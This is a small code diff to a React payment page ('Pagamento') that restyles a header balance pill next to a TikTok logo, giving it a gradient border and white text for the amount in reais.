@@ -172,9 +172,9 @@ const Pagamento = () => {
         {/* Header with logo and saldo */}
         <div className="flex items-center justify-between">
           <img src={tiktokLogo} alt="TikTok" className="h-8" loading="eager" decoding="async" />
-          <div className="rounded-full border-2 border-secondary px-4 py-1.5">
+          <div className="rounded-full border-2 border-transparent px-4 py-1.5" style={{ background: "linear-gradient(#000, #000) padding-box, linear-gradient(135deg, #25F4EE, #FE2B54) border-box", borderRadius: 999 }}>
             <p className="text-[10px] text-gray-400 leading-none">Saldo:</p>
-            <p className="text-sm font-bold text-black">R$ {SALDO.toFixed(2).replace(".", ",")}</p>
+            <p className="text-sm font-bold text-white">R$ {SALDO.toFixed(2).replace(".", ",")}</p>
           </div>
         </div>
 
